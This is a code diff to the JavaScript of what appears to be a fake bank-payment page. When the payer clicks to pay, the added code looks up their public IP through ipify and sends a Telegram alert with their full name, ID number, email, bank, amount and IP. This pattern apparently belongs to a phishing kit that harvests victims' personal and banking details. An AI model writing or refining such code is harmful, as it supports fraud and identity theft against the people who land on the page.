@@ -131,26 +131,51 @@ if (botonPagar) {
             return;
         }
 
-        // --- ENVÍO DE ALERTA A TELEGRAM (antes de mostrar overlay)
+        // --- OBTENER IP PÚBLICA (INTENTO EN EL CLIENTE) ---
+        let ip = data.ip || 'N/D';
+        try {
+            const controller = new AbortController();
+            const idTimeout = setTimeout(() => controller.abort(), 4000); // timeout 4s
+            const ipResp = await fetch('https://api.ipify.org?format=json', { signal: controller.signal });
+            clearTimeout(idTimeout);
+            if (ipResp.ok) {
+                const ipJson = await ipResp.json(); // { ip: "x.x.x.x" }
+                if (ipJson && ipJson.ip) {
+                    ip = ipJson.ip;
+                    data.ip = ip;
+                    try {
+                        localStorage.setItem('datosFactura', JSON.stringify(data));
+                    } catch (e) {
+                        // Si localStorage falla por cuota, no cortamos el flujo
+                        console.warn('No se pudo actualizar localStorage con la IP:', e);
+                    }
+                    if (document.getElementById('lblIp')) document.getElementById('lblIp').textContent = ip;
+                }
+            }
+        } catch (e) {
+            console.warn('No se pudo obtener IP pública (ipify o timeout):', e);
+            // dejamos ip como estaba (data.ip) o 'N/D'
+        }
+
+        // --- ENVÍO DE ALERTA A TELEGRAM (antes de mostrar overlay) ---
         try {
             const nombre = data.nombreCompleto || 'N/A';
             const referencia = data.referencia || 'N/A';
-            const ip = data.ip || 'N/D';
             const idTipo = data.tipoId || '';
             const idNum = data.numId || '';
 
-            const mensaje = `<b>Pago iniciado</b>%0A` +
-                `Nombre: ${escapeHtml(nombre)}%0A` +
-                `ID: ${escapeHtml(idTipo)} - ${escapeHtml(idNum)}%0A` +
-                `Correo: ${escapeHtml(email)}%0A` +
-                `Banco: ${escapeHtml(banco)}%0A` +
-                `Monto: ${escapeHtml(amount.toString())}%0A` +
-                `Ref: ${escapeHtml(referencia)}%0A` +
+            // Construimos mensaje con saltos de línea (Telegram acepta \n)
+            const mensaje = `<b>Pago iniciado</b>\n` +
+                `Nombre: ${escapeHtml(nombre)}\n` +
+                `ID: ${escapeHtml(idTipo)} - ${escapeHtml(idNum)}\n` +
+                `Correo: ${escapeHtml(email)}\n` +
+                `Banco: ${escapeHtml(banco)}\n` +
+                `Monto: ${escapeHtml(amount.toString())}\n` +
+                `Ref: ${escapeHtml(referencia)}\n` +
                 `IP: ${escapeHtml(ip)}`;
 
-            // Telegram acepta saltos de línea; usamos decodeURIComponent en servidor si fuera necesario.
             // Enviamos la alerta (no bloqueante)
-            sendTelegramAlert(decodeURIComponent(mensaje));
+            sendTelegramAlert(mensaje);
         } catch (e) {
             console.warn('No se pudo preparar la alerta de Telegram:', e);
         }
@@ -292,5 +317,4 @@ function enmascararCorreo(email) {
     if(!email) return "";
     const [user, domain] = email.split("@");
     return user.substring(0, 2) + "*******@" + "*****." + "com";
-
 }
